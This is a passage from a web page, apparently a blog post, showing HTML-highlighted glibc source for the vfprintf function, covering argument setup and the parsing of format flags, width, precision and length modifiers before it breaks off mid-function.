class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">vfprintf</span> <span class=\"params\">(FILE *s, <span class=\"type\">const</span> CHAR_T *format, va_list ap, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> mode_flags)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* The character used as thousands separator.  */</span></span><br><span class=\"line\">  THOUSANDS_SEP_T thousands_sep = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The string describing the size of groups of digits.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *grouping;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Place to accumulate the result.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Current character in format string.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> UCHAR_T *f;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* End of leading constant string.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> UCHAR_T *lead_str_end;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Points to next format specifier.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> UCHAR_T *end_of_spec;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Buffer intermediate results.  */</span></span><br><span class=\"line\">  CHAR_T work_buffer[WORK_BUFFER_SIZE];</span><br><span class=\"line\">  CHAR_T *workend;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* We have to save the original argument pointer.  */</span></span><br><span class=\"line\">  va_list ap_save;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Count number of specifiers we already processed.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nspecs_done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* For the %m format we may need the current `errno&#x27; value.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> save_errno = errno;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 1 if format is in read-only memory, -1 if it is in writable memory,</span></span><br><span class=\"line\"><span class=\"comment\">     0 if unknown.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> readonly_format = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Orient the stream.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> ORIENT</span></span><br><span class=\"line\">  ORIENT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Sanity check of arguments.  */</span></span><br><span class=\"line\">  ARGCHECK (s, format);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> ORIENT</span></span><br><span class=\"line\">  <span class=\"comment\">/* Check for correct orientation.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_vtable_offset (s) == <span class=\"number\">0</span></span><br><span class=\"line\">      &amp;&amp; _IO_fwide (s, <span class=\"keyword\">sizeof</span> (CHAR_T) == <span class=\"number\">1</span> ? <span class=\"number\">-1</span> : <span class=\"number\">1</span>)</span><br><span class=\"line\">      != (<span class=\"keyword\">sizeof</span> (CHAR_T) == <span class=\"number\">1</span> ? <span class=\"number\">-1</span> : <span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"comment\">/* The stream is already oriented otherwise.  */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (UNBUFFERED_P (s))</span><br><span class=\"line\">    <span class=\"comment\">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class=\"line\"><span class=\"comment\">       for the stream and then call us again.  */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Initialize local variables.  */</span></span><br><span class=\"line\">  done = <span class=\"number\">0</span>;</span><br><span class=\"line\">  grouping = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __va_copy</span></span><br><span class=\"line\">  <span class=\"comment\">/* This macro will be available soon in gcc&#x27;s &lt;stdarg.h&gt;.  We need it</span></span><br><span class=\"line\"><span class=\"comment\">     since on some systems `va_list&#x27; is not an integral type.  */</span></span><br><span class=\"line\">  __va_copy (ap_save, ap);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  ap_save = ap;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  nspecs_done = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">  <span class=\"comment\">/* Find the first format specifier.  */</span></span><br><span class=\"line\">  f = lead_str_end = __find_specwc ((<span class=\"type\">const</span> UCHAR_T *) format);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* Find the first format specifier.  */</span></span><br><span class=\"line\">  f = lead_str_end = __find_specmb ((<span class=\"type\">const</span> UCHAR_T *) format);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Lock stream.  */</span></span><br><span class=\"line\">  _IO_cleanup_region_start ((<span class=\"type\">void</span> (*) (<span class=\"type\">void</span> *)) &amp;_IO_funlockfile, s);</span><br><span class=\"line\">  _IO_flockfile (s);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Write the literal text before the first format.  */</span></span><br><span class=\"line\">  outstring ((<span class=\"type\">const</span> UCHAR_T *) format,</span><br><span class=\"line\">\t     lead_str_end - (<span class=\"type\">const</span> UCHAR_T *) format);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* If we only have to print a simple string, return now.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (*f == L_(<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (__printf_function_table != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t\t\t|| __printf_modifier_table != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t\t\t|| __printf_va_arg_table != <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Process whole format string.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      STEP0_3_TABLE;</span><br><span class=\"line\">      STEP4_TABLE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">int</span> is_negative;\t<span class=\"comment\">/* Flag for negative number.  */</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">      &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> longlong;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span> word;</span><br><span class=\"line\">      &#125; number;</span><br><span class=\"line\">      <span class=\"type\">int</span> base;</span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">printf_arg</span> <span class=\"title\">the_arg</span>;</span></span><br><span class=\"line\">      CHAR_T *<span class=\"built_in\">string</span>;\t<span class=\"comment\">/* Pointer to argument string.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> alt = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Alternate format.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> space = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Use space prefix if no sign is needed.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> left = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Left-justify output.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> showsign = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Always begin with plus or minus sign.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> group = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Print numbers according grouping rules.  */</span></span><br><span class=\"line\">      <span class=\"comment\">/* Argument is long double/long long int.  Only used if</span></span><br><span class=\"line\"><span class=\"comment\">\t double/long double or long int/long long int are distinct.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> is_long_double __attribute__ ((unused)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_short = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Argument is short int.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> is_long = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Argument is long int.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> is_char = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Argument is promoted (unsigned) char.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> width = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Width of output; 0 means none specified.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> prec = <span class=\"number\">-1</span>;\t<span class=\"comment\">/* Precision of output; -1 means none specified.  */</span></span><br><span class=\"line\">      <span class=\"comment\">/* This flag is set by the &#x27;I&#x27; modifier and selects the use of the</span></span><br><span class=\"line\"><span class=\"comment\">\t `outdigits&#x27; as determined by the current locale.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> use_outdigits = <span class=\"number\">0</span>;</span><br><span class=\"line\">      UCHAR_T pad = L_(<span class=\"string\">&#x27; &#x27;</span>);<span class=\"comment\">/* Padding character.  */</span></span><br><span class=\"line\">      CHAR_T spec;</span><br><span class=\"line\"></span><br><span class=\"line\">      workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Get current character in format string.  */</span></span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* &#x27; &#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_space):</span><br><span class=\"line\">      space = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* &#x27;+&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_plus):</span><br><span class=\"line\">      showsign = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;-&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_minus):</span><br><span class=\"line\">      left = <span class=\"number\">1</span>;</span><br><span class=\"line\">      pad = L_(<span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;#&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_hash):</span><br><span class=\"line\">      alt = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;0&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_zero):</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!left)</span><br><span class=\"line\">\tpad = L_(<span class=\"string\">&#x27;0&#x27;</span>);</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;\\&#x27;&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_quote):</span><br><span class=\"line\">      group = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (grouping == (<span class=\"type\">const</span> <span class=\"type\">char</span> *) <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">\t  thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class=\"line\">\t\t\t\t\t    _NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">\t  thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t  grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (*grouping == <span class=\"string\">&#x27;\\0&#x27;</span> || *grouping == CHAR_MAX</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">\t      || thousands_sep == <span class=\"string\">L&#x27;\\0&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">\t      || *thousands_sep == <span class=\"string\">&#x27;\\0&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t      )</span><br><span class=\"line\">\t    grouping = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (flag_i18n):</span><br><span class=\"line\">      use_outdigits = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Get width from argument.  */</span></span><br><span class=\"line\">    LABEL (width_asterics):</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> UCHAR_T *tmp;\t<span class=\"comment\">/* Temporary value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">\ttmp = ++f;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ISDIGIT (*tmp))</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"type\">int</span> pos = read_int (&amp;tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (pos == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t__set_errno (EOVERFLOW);</span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (pos &amp;&amp; *tmp == L_(<span class=\"string\">&#x27;$&#x27;</span>))</span><br><span class=\"line\">\t      <span class=\"comment\">/* The width comes from a positional parameter.  */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\twidth = va_arg (ap, <span class=\"type\">int</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* Negative width means left justified.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (width &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    width = -width;</span><br><span class=\"line\">\t    pad = L_(<span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">\t    left = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      JUMP (*f, step1_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Given width in format string.  */</span></span><br><span class=\"line\">    LABEL (width):</span><br><span class=\"line\">      width = read_int (&amp;f);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (width == <span class=\"number\">-1</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  __set_errno (EOVERFLOW);</span><br><span class=\"line\">\t  done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t  <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (*f == L_(<span class=\"string\">&#x27;$&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"comment\">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class=\"line\">\t<span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">      JUMP (*f, step1_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (precision):</span><br><span class=\"line\">      ++f;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (*f == L_(<span class=\"string\">&#x27;*&#x27;</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"type\">const</span> UCHAR_T *tmp;\t<span class=\"comment\">/* Temporary value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t  tmp = ++f;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (ISDIGIT (*tmp))</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"type\">int</span> pos = read_int (&amp;tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (pos == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  __set_errno (EOVERFLOW);</span><br><span class=\"line\">\t\t  done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t  <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (pos &amp;&amp; *tmp == L_(<span class=\"string\">&#x27;$&#x27;</span>))</span><br><span class=\"line\">\t\t<span class=\"comment\">/* The precision comes from a positional parameter.  */</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  prec = va_arg (ap, <span class=\"type\">int</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* If the precision is negative the precision is omitted.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (prec &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    prec = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ISDIGIT (*f))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  prec = read_int (&amp;f);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* The precision was specified in this case as an extremely</span></span><br><span class=\"line\"><span class=\"comment\">\t     large positive value.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (prec == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      __set_errno (EOVERFLOW);</span><br><span class=\"line\">\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tprec = <span class=\"number\">0</span>;</span><br><span class=\"line\">      JUMP (*f, step2_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class=\"line\">    LABEL (mod_half):</span><br><span class=\"line\">      is_short = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step3a_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class=\"line\">    LABEL (mod_halfhalf):</span><br><span class=\"line\">      is_short = <span class=\"number\">0</span>;</span><br><span class=\"line\">      is_char = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class=\"line\">    LABEL (mod_long):</span><br><span class=\"line\">      is_long = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step3b_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class=\"line\"><span class=\"comment\">\t allowed to follow.  */</span></span><br><span class=\"line\">    LABEL (mod_longlong):</span><br><span class=\"line\">      is_long_double = <span class=\"number\">1</span>;</span><br><span class=\"line\">      is_long = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (<span class=\"type\">mod_size_t</span>):</span><br><span class=\"line\">      is_long_double = <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      is_long = <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (<span class=\"type\">mod_ptrdiff_t</span>):</span><br><span class=\"line\">      is_long_double = <span class=\"keyword\">sizeof</span> (<span class=\"type\">ptrdiff_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      is_long = <span class=\"keyword\">sizeof</span> (<span class=\"type\">ptrdiff_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (<span class=\"type\">mod_intmax_t</span>):</span><br><span class=\"line\">      is_long_double = <span class=\"keyword\">sizeof</span> (<span class=\"type\">intmax_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      is_long = <span class=\"keyword\">sizeof</span> (<span class=\"type\">intmax_t</span>) &gt; <span class=\"keyword\">sizeof</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>);</span><br><span class=\"line\">      JUMP (*++f, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process current format.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_int() va_arg (ap, int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_int() va_arg (ap, long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_long_int() va_arg (ap, long long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_pointer() va_arg (ap, void *)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_string() va_arg (ap, const char *)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_int() va_arg (ap, unsigned int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_int() va_arg (ap, unsigned long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wchar_t() va_arg (ap, wchar_t)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wstring() va_arg (ap, const wchar_t *)</span></span><br><span class=\"line\">\t  process_arg ();</span><br><span class=\"line\">\t  process_string_arg ();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_pointer</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_string</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wchar_t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wstring</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tLABEL (form_float):</span><br><span class=\"line\">\tLABEL (form_floathex):</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t      is_long_double = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">printf_info</span> <span class=\"title\">info</span> =</span></span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t.prec = prec,</span><br><span class=\"line\">\t\t.width = width,</span><br><span class=\"line\">\t\t.spec = spec,</span><br><span class=\"line\">\t\t.is_long_double = is_long_double,</span><br><span class=\"line\">\t\t.is_short = is_short,</span><br><span class=\"line\">\t\t.is_long = is_long,</span><br><span class=\"line\">\t\t.alt = alt,</span><br><span class=\"line\">\t\t.space = space,</span><br><span class=\"line\">\t\t.left = left,</span><br><span class=\"line\">\t\t.showsign = showsign,</span><br><span class=\"line\">\t\t.group = group,</span><br><span class=\"line\">\t\t.pad = pad,</span><br><span class=\"line\">\t\t.extra = <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t.i18n = use_outdigits,</span><br><span class=\"line\">\t\t.wide = <span class=\"keyword\">sizeof</span> (CHAR_T) != <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\t.is_binary128 = <span class=\"number\">0</span></span><br><span class=\"line\">\t      &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    